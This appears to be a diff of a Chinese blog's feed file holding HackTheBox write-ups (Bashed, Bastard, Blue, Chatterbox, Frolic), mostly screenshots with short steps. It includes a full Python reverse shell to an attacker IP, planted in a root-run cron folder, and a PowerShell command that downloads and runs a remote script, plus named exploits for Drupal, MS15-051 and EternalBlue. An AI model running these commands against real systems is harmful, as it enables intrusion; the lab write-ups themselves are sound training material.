+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;10.10.14.19&quot;,7776)); os.dup2(s.fileno(),0);  os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2j518ca4hlu0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2otxreay7oo0.webp"
+                     
+                ></p>
+<p>看看有没有可以利用的</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.3giosuax2h60.webp"
+                     
+                ></p>
+<p>发现一个scriptmanager用户，sudo -u scriptmanager bash -i切换过去</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.364179m6ygo0.webp"
+                     
+                ></p>
+<p>在根目录下有一个scripts文件夹</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.3ak4w2hu76w0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6ijw8ywyvtk0.webp"
+                     
+                ></p>
+<p>执行脚本后会往test.txt文本中写入一段话，尝试删除test.txt</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2l4m8c6anss0.webp"
+                     
+                ></p>
+<p>发现几分钟后又创建了一个，而且所有者为root</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6n1rqqninyo0.webp"
+                     
+                ></p>
+<p>由此可以推断，该目录下的所有脚本，会定时被root所执行，此时只需要一个反弹的python文件即可，继续使用上面反弹所用的python命令</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2ct38p3jsejo.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.13966zcxcwjk.webp"
+                     
+                ></p>
+<p>监听7766</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.1orsdqfm5hsw.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.1uudmhn351cw.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bastard - HackTheBox</title>
+    <url>/post/018e0822dc20/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.5ozhzwi5h2o0.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.1gdsruyldon4.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.3f20du91a600.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.kate6vlmsdc.webp"
+                     
+                ></p>
+<p>访问80端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.7yg573bpcjo.webp"
+                     
+                ></p>
+<p>好眼熟啊，貌似这个cms是drupal，但不确定版本</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.4mf24gsfsfc0.webp"
+                     
+                ></p>
+<p>robots文件看看</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.39zgi3txwh00.webp"
+                     
+                ></p>
+<p>change.log文件确定了版本，搜一下exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.2d25cra5eb0g.webp"
+                     
+                ></p>
+<p>版本范围符合</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.1sr5gy41e83k.webp"
+                     
+                ></p>
+<p><code>https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py</code></p>
+<p>利用exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.6h6yj4gbsj00.webp"
+                     
+                ></p>
+<p>反弹shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.13pwsklfyr4w.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.46wo3ug0lte0.webp"
+                     
+                ></p>
+<p>提权</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.4imaj2voyww0.webp"
+                     
+                ></p>
+<p>最终确定MS15-051有效</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.dyvejp0xjuw.webp"
+                     
+                ></p>
+<p><code>https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/ms15-051.md</code></p>
+<p>老样子，msf生成一个反弹后门，用MS15-015运行</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.61s7o1rfho00.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.2nfx1ujf90a0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.2ub29bcsgeu0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.4g1myok3z3q0.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Bitlab - HackTheBox</title>
     <url>/post/427daae154a1/</url>
     <content><![CDATA[<p><img  
@@ -2088,80 +2088,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Blue - HackTheBox</title>
-    <url>/post/74c4d842e2fd/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.3yj2oep78c20.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.4hu4qt0nfy80.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.5i2oj2rl0kg0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.2sa036eumyw0.webp"
-                     
-                ></p>
-<p>win7系统，扫一下445</p>
-<p><code>nmap -n -v -p 445 --script=smb-vuln* 10.10.10.40 -Pn</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.1kq5ri8zep40.webp"
-                     
-                ></p>
-<p>永恒之蓝，老样子，msf梭哈</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.55h5mevmz7c0.webp"
-                     
-                ></p>
-<p>用第二个</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.4rbweuvxt1g0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.1q5pjoapeo1s.webp"
-                     
-                ></p>
-<p>直接system权限了</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.1d4fhik254zk.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.5wcd91wjjhc0.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Blocky - HackTheBox</title>
     <url>/post/c1cc1ff33f67/</url>
     <content><![CDATA[<p><img  
@@ -2352,6 +2278,80 @@
                      
                 ></p>
 <p>还有其他提权方法，不一个一个试了，主要是lxd那块太慢了，浪费时间</p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Blue - HackTheBox</title>
+    <url>/post/74c4d842e2fd/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.3yj2oep78c20.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.4hu4qt0nfy80.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.5i2oj2rl0kg0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.2sa036eumyw0.webp"
+                     
+                ></p>
+<p>win7系统，扫一下445</p>
+<p><code>nmap -n -v -p 445 --script=smb-vuln* 10.10.10.40 -Pn</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.1kq5ri8zep40.webp"
+                     
+                ></p>
+<p>永恒之蓝，老样子，msf梭哈</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.55h5mevmz7c0.webp"
+                     
+                ></p>
+<p>用第二个</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.4rbweuvxt1g0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.1q5pjoapeo1s.webp"
+                     
+                ></p>
+<p>直接system权限了</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.1d4fhik254zk.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.5wcd91wjjhc0.webp"
+                     
+                ></p>
 ]]></content>
       <tags>
         <tag>Hack-The-Box</tag>
@@ -3031,6 +3031,146 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Chatterbox - HackTheBox</title>
+    <url>/post/c089cde000c7/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.7jwiq8vcwjc0.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2kvnnvyqwcs0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5qfe212zjj40.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.4afl8ap43d40.webp"
+                     
+                ></p>
+<p>9255和9256端口显示为同一个服务，访问看看</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5dmvh3p55sc0.webp"
+                     
+                ></p>
+<p>9255访问为空</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.50vjfhjwgvg0.webp"
+                     
+                ></p>
+<p>9256也不知道是个啥，搜一下有无exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2ksb564dg1i0.webp"
+                     
+                ></p>
+<p>一个缓冲区溢出漏洞</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.130awguikay.webp"
+                     
+                ></p>
+<p>还给了生成方法，修改一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5exxuddt8280.webp"
+                     
+                ></p>
+<p>修改为用powershell远程请求本地的反弹shell文件</p>
+<p>exploit-db给的python脚本那就是死活没用啊，换了一个github的脚本</p>
+<p><code>https://github.com/mpgn/AChat-Reverse-TCP-Exploit</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5k6zobm7wyk0.webp"
+                     
+                ></p>
+<p>把ip也修改一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.r9lr7cj5y4w.webp"
+                     
+                ></p>
+<p>提权</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6oud2h2h8bw0.webp"
+                     
+                ></p>
+<p>提权脚本检测了一下，基本是没有可利用的</p>
+<p>利用powerup检测一下，发现当前用户的密码</p>
+<p><code>powershell.exe -nop -exec bypass -c &quot;iex(new-object system.net.webclient).downloadstring(&#39;http://10.10.14.17/PowerUp.ps1&#39;)&quot;</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.qgy8vsx541s.webp"
+                     
+                ></p>
+<p>尝试用这个密码切换一下用户</p>
+<p><code>https://stackoverflow.com/questions/15895877/how-to-switch-current-user-using-powershell</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6arrkdd4vbg0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.4u8kflh1ba80.webp"
+                     
+                ></p>
+<p>修改一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5ucl5u4zqg80.webp"
+                     
+                ></p>
+<p>依次执行</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6kq9u0gaj7k0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2rmkg5iaeds0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.1lhfnaom3y68.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Cronos - HackTheBox</title>
     <url>/post/d7494865a491/</url>
     <content><![CDATA[<p><img  
@@ -3213,146 +3353,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Chatterbox - HackTheBox</title>
-    <url>/post/c089cde000c7/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.7jwiq8vcwjc0.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2kvnnvyqwcs0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5qfe212zjj40.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.4afl8ap43d40.webp"
-                     
-                ></p>
-<p>9255和9256端口显示为同一个服务，访问看看</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5dmvh3p55sc0.webp"
-                     
-                ></p>
-<p>9255访问为空</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.50vjfhjwgvg0.webp"
-                     
-                ></p>
-<p>9256也不知道是个啥，搜一下有无exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2ksb564dg1i0.webp"
-                     
-                ></p>
-<p>一个缓冲区溢出漏洞</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.130awguikay.webp"
-                     
-                ></p>
-<p>还给了生成方法，修改一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5exxuddt8280.webp"
-                     
-                ></p>
-<p>修改为用powershell远程请求本地的反弹shell文件</p>
-<p>exploit-db给的python脚本那就是死活没用啊，换了一个github的脚本</p>
-<p><code>https://github.com/mpgn/AChat-Reverse-TCP-Exploit</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5k6zobm7wyk0.webp"
-                     
-                ></p>
-<p>把ip也修改一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.r9lr7cj5y4w.webp"
-                     
-                ></p>
-<p>提权</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6oud2h2h8bw0.webp"
-                     
-                ></p>
-<p>提权脚本检测了一下，基本是没有可利用的</p>
-<p>利用powerup检测一下，发现当前用户的密码</p>
-<p><code>powershell.exe -nop -exec bypass -c &quot;iex(new-object system.net.webclient).downloadstring(&#39;http://10.10.14.17/PowerUp.ps1&#39;)&quot;</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.qgy8vsx541s.webp"
-                     
-                ></p>
-<p>尝试用这个密码切换一下用户</p>
-<p><code>https://stackoverflow.com/questions/15895877/how-to-switch-current-user-using-powershell</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6arrkdd4vbg0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.4u8kflh1ba80.webp"
-                     
-                ></p>
-<p>修改一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5ucl5u4zqg80.webp"
-                     
-                ></p>
-<p>依次执行</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6kq9u0gaj7k0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2rmkg5iaeds0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.1lhfnaom3y68.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Delivery - HackTheBox</title>
     <url>/post/9ef8c7d2ce46/</url>
     <content><![CDATA[<p><img  
@@ -3465,7 +3465,7 @@
                      data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.7dhthjgbrsw0.webp"
                      
                 ></p>
-<p>尝试用那个<a class="link"   href="mailto:&#55;&#x37;&#x34;&#x39;&#x39;&#x36;&#51;&#x40;&#x64;&#101;&#x6c;&#105;&#x76;&#101;&#x72;&#x79;&#x2e;&#104;&#116;&#98;" >&#55;&#x37;&#x34;&#x39;&#x39;&#x36;&#51;&#x40;&#x64;&#101;&#x6c;&#105;&#x76;&#101;&#x72;&#x79;&#x2e;&#104;&#116;&#98;<i class="fas fa-external-link-alt"></i></a>票据邮箱注册一下</p>
+<p>尝试用那个<a class="link"   href="mailto:&#x37;&#55;&#52;&#x39;&#57;&#54;&#51;&#x40;&#x64;&#101;&#x6c;&#x69;&#118;&#101;&#x72;&#x79;&#x2e;&#104;&#x74;&#x62;" >&#x37;&#55;&#52;&#x39;&#57;&#54;&#51;&#x40;&#x64;&#101;&#x6c;&#x69;&#118;&#101;&#x72;&#x79;&#x2e;&#104;&#x74;&#x62;<i class="fas fa-external-link-alt"></i></a>票据邮箱注册一下</p>
 <p><img  
                      lazyload
                      alt="image"
@@ -4878,6 +4878,411 @@
       </tags>
   </entry>
   <entry>
+    <title>Frolic - HackTheBox</title>
+    <url>/post/f72fd971108b/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.21ny47h7efwg.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.77794fdpfck0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2zwbmtpnyte0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.638w31tj9bw0.webp"
+                     
+                ></p>
+<p>开放有两个http端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.53o2kmsdbzc0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3qg7me14ndk0.webp"
+                     
+                ></p>
+<p>弱口令登不上，扫目录</p>
+<p>扫目录的过程中，看到445和139开放了Samba，也尝试一下</p>
+<p><code>enum4linux -a 10.10.10.111</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5mui1e34l3g0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.6fupmjimq8s0.webp"
+                     
+                ></p>
+<p><code>smbclient \\\\WORKGROUP\\print -I 10.10.10.111 -N</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.35p5y97603m0.webp"
+                     
+                ></p>
+<p>没用</p>
+<p>扫描目录结果</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2nzwmjnivuu0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.4y3p3luirpc0.webp"
+                     
+                ></p>
+<p>发现一个admin页面登录框</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.1e7td96ef4u8.webp"
+                     
+                ></p>
+<p>不知道密码</p>
+<p>backup下发现user.txt和password.txt</p>
